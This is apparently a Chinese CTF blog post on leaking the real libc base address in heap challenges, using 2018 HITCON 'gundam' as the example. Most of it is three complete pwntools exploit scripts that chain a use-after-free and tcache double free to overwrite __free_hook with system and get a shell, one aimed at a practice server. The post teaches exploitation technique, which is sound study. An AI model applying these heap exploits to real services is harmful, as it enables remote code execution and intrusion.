---
title:  pwn堆题泄露libc真实地址小tirck
categories: [CTF]
tags: [pwn]

---
在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。<!--more-->

## 本地地址泄露方法

我们以2018-HitCon-Pwn-gundam来分析下，题目保护如下：

![image-20210503234633625](image-20210503234633625.png)

> 由于linux中使用`free()`进行内存释放时，不大于 `max_fast` （默认值为 64B）的 chunk 被释放后，首先会被放到 `fast bins`中，大于`max_fast`的chunk或者`fast bins` 中的空闲 chunk 合并后会被放入`unsorted bin`中。而在fastbin为空时，`unsortbin`的fd和bk指向自身`main_arena`中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出`main_arena`的实际地址，结合偏移值从而得到libc的加载地址。
>

所以我们在做堆题时，通常都是我们想办法构造出一个大于0x90的chunk来free掉加入unsorted bin，获得一个在`main_arena`相近的值从而得到`main_arena`的真实地址。再通过gdb  vmmap 得到libc的基地址.

![image-20210503232104347](image-20210503232104347.png)

再继续通过gdb寻找`__free_hook`、`__malloc__hook`、`system`这些敏感symbols的地址，计算出他们与libc基地址偏移。

![image-20210503232436354](image-20210503232436354.png)

这样在同一个环境中，就算开了保护 libc.so 动态链接库中的symbols与libc 基地址相对偏移是固定的。我们得到了unsorted bin就可以得到所有我们想要的地址。

![image-20210503234159126](image-20210503234159126.png)

这样方法写出的exp如下：

```python
from pwn import *
#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)
p=process('./gundam')
#context.log_level = 'debug'
def build(name):
    p.sendlineafter("choice : ","1")
    p.sendlineafter("gundam :",name)
    p.sendlineafter("gundam :",'0')

def visit():
    p.sendlineafter("choice : ",'2')

def free(idx):
    p.sendlineafter("choice : ",'3')
    p.sendlineafter("Destory:",str(idx))

def blow_up():
    p.sendlineafter("choice : ",'4')


for i in range(9):
	build('a'*0x10)

for i in range(8):
	free(i)
blow_up()
for i in range(7):
	build('a'*0x4)
build('B'*7)
blow_up()
visit()
addr = (p.recvuntil("Type[7]",drop=True)[-6:].ljust(8,'\x00'))
print(addr)
#gdb.attach(p)
print(hex(u64(addr)))
base=u64(addr)-0x3afca0
print(hex(base))
free_hook=base+0x3b18e8
print('4')
free(5)
free(4)
free(3)
blow_up()
free(2)
free(1)
free(0)
free(0)

build(p64(free_hook))

build('/bin/sh\x00')

build(p64(base+0x41780))

free(0)
gdb.attach(p)

p.interactive()
```

## 减少gdb调试依赖

但我们这样做有缺陷，我们所有的地址都是通过本地gdb一个一个gdb出来。所有偏移的计算过程，都有本地gdb参与。然不同的libc下，各symbols的偏移是不同。而远程下我们是不能进行gdb调的。但我们发现，libc与`__free_hook`、`__malloc__hook`、`system`这些敏感symbols的地址的偏移差距不仅固定，而且就是symbols在so文件中地址的差异。

![image-20210504002319132](image-20210504002319132.png)

这样利用pwntool 中的`symbols`来获得偏移，从而减少了对gdb调试的依赖。同时，又通过附件中的libc得到了远程环境的相同的偏移。

这样写法的完整exp：

```python
from pwn import *
#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)
p=process('./gundam')
l=ELF('/glibc/2.27/amd64/lib/libc.so.6')
#context.log_level = 'debug'
def build(name):
    p.sendlineafter("choice : ","1")
    p.sendlineafter("gundam :",name)
    p.sendlineafter("gundam :",'0')

def visit():
    p.sendlineafter("choice : ",'2')

def free(idx):
    p.sendlineafter("choice : ",'3')
    p.sendlineafter("Destory:",str(idx))

def blow_up():
    p.sendlineafter("choice : ",'4')


for i in range(9):
	build('a'*0x10)

for i in range(8):
	free(i)
blow_up()
for i in range(7):
	build('a'*0x4)
build('B'*7)
blow_up()
visit()
addr = (p.recvuntil("Type[7]",drop=True)[-6:].ljust(8,'\x00'))
print(addr)

print(hex(u64(addr)))
main_arena=u64(addr)-96
log.info('main_arene:'+hex(main_arena))
base=main_arena-0x3afc40
log.info('libc_base:'+hex(base))
free_hook=base+l.symbols['__free_hook']
log.info('free_hook:'+hex(free_hook))
system_addr=base+l.symbols['system']
log.info('system:'+hex(system_addr))
#gdb.attach(p)
print('4')
free(5)
free(4)
free(3)
blow_up()
free(2)
free(1)
free(0)
free(0)

build(p64(free_hook))

build('/bin/sh\x00')

build(p64(system_addr))

free(0)
#gdb.attach(p)

p.interactive()
```

## 远程libc基地址泄露

前面，我们虽然利用题目的附件里的libc来解决`__free_hook`、`__malloc__hook`、`system`这些敏感symbols的地址的在远程环境和本地环境下偏移的差距但是libc基地址的问题依然没有解决。我们观测远程libc基地址仅仅看`main_arena`-gdb出偏移得到的地址后三位是否为0，但地址后三位是为0的地址不一定是libc基址。

![image-20210504003927457](image-20210504003927457.png)

因为在一些附件so文件中，`main_arena`是没有的,但是有`__malloc_hook`和`__realloc_hook`。

![image-20210504100155315](image-20210504100155315.png)

我们不可能通过`real_base_libc=main_arena_add-l.symbols['main_arena']`来获得基地址。但如果我们gdb过`main_arena`的地址和看过libc结构就可以发现`__malloc_hook`和`__realloc_hook`这两个symbols其实"挨得近"且这距离不受libc版本影响。

![image-20210504094456672](image-20210504094456672.png)

因此我们可以通过,`mian_arena-0x10`得到`__malloc_hook`的真实地址`__malloc_hook_addr`，`mian_arena-0x18`得到`__realloc_hook`的真实地址`__realloc_hook_addr`。`__malloc_hook_addr-l.symbols["__malloc_hook"]`或`__realloc_hook_addr-l.symbols["__realloc_hook"]`都可以得到libc的基地址。

![image-20210504101842757](image-20210504101842757.png)

这样我们就可以不通gdb出libc偏移，就可以得到远程libc的准确基址。

## 无so文件推算远程地址

经过上面步骤改进，我们已经能做到准确得到远程环境地址中任意敏感symbols的地址。但是，我们这过程太依赖题目附近中的so文件。so文件的准确有效性，直接影响到我推算远程地址。那么若题目给了错误的libc或题目只给了libc大版本号没有给出so文件，那还能做题吗?

回顾整个过程，在整个过程中我们最值得信任的地址就是通过`unsorted bin`得到`main_arena`的地址以及通过`main_arena`所得到的`__malloc_hook`或`__realloc_hook`的地址。这是由于这些地址是从单纯利用glibc chunk管理机制中所得到的。

再回想到，栈溢出时我们获得libc基址时我们只泄露一个函数的最低的 12 位就可以找到相应libc版本。其应用的原理是：

> system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
> 		即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。

既然函数是libc symbols中的一种，那么`__malloc_hook`或`__realloc_hook`这些 libc中的变量能一样吗？

经过查询[libc-database](https://github.com/niklasb/libc-database)和测试发现`__malloc_hook`或`__realloc_hook`这些变量symbols也和函数一样被记录下来。而且:

__在libc中，不仅函数所有libc symbols在 libc.so 动态链接库中,相对之间相对偏移是固定的__。

__即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，所有libc symbols最低的 12 位并不会发生改变。__

因此我们可以向在做栈溢出一样，用LibcSearcher来找到远程libc版本，从而推算出各个敏感symbols的地址。

```python
from LibcSearcher import LibcSearcher
libc = LibcSearcher('__malloc_hook', malloc_hook)#寻找libc版本
libcbase = malloc_hook - libc.dump('__malloc_hook')#计算基地地址
log.info('base:'+hex(libcbase))

system=libcbase+libc.dump('system')#计算system函数地址
log.info('libcbase+system:'+hex(system))

free_hook=libcbase+libc.dump('__free_hook')#计算__free_hook变量地址
log.info('libcbase+free_hook:'+hex(libcbase+libc.dump('__free_hook')))
```

## 2018-HitCon-Pwn-gundam 远程exp

综上，我们可以利用这些tirck做出一些“阴间环境”的堆题，2018-HitCon-Pwn-gundam就是其中一道（笑）

![image-20210504112333320](buu_gundam.png)

由于libc不准确，在buu上题目做出人很少。我们可以用我们上面用到的方法找与题目相匹配的libc。从而解决题目。

```python
from pwn import *
from LibcSearcher import LibcSearcher
p=remote('node3.buuoj.cn',25457)
#p=process('./gundam')
#l=ELF('./libc.so.6')
def build(name):
    p.sendlineafter("choice : ","1")
    p.sendlineafter("gundam :",name)
    p.sendlineafter("gundam :",'0')

def visit():
    p.sendlineafter("choice : ",'2')

def free(idx):
    p.sendlineafter("choice : ",'3')
    p.sendlineafter("Destory:",str(idx))

def blow_up():
    p.sendlineafter("choice : ",'4')


for i in range(9):
	build('a'*0x10)

for i in range(7):
	free(i)

free(7)

blow_up()

for i in range(7):
	build('a'*8)
#gdb.attach(p)
build('a'*8)
visit()

p.recvuntil('Gundam[7] :aaaaaaaa')
addr=p.recv()[1:6].ljust(8,'\x00')

x=int(hex(u64(addr))+'40',16)
log.info('main_arena:'+hex(x))

malloc_hook=x-0x10
log.info('malloc_hook:'+hex(malloc_hook))

libc = LibcSearcher('__malloc_hook', malloc_hook)
libcbase = malloc_hook - libc.dump('__malloc_hook')
log.info('base:'+hex(libcbase))

system=libcbase+libc.dump('system')
log.info('libcbase+system:'+hex(system))

free_hook=libcbase+libc.dump('__free_hook')
log.info('libcbase+free_hook:'+hex(libcbase+libc.dump('__free_hook')))

p.sendline('2')
free(7)
free(6)
free(5)
free(4)
blow_up()

free(3)
free(3)

build(p64(free_hook))

build('/bin/sh\x00')

#gdb.attach(p)
build(p64(system))

free(5)
#gdb.attach(p)
p.interactive()
```

找到与远程相匹配的libc，就可以得到flag。

![image-20210504112951072](gundam_2.png)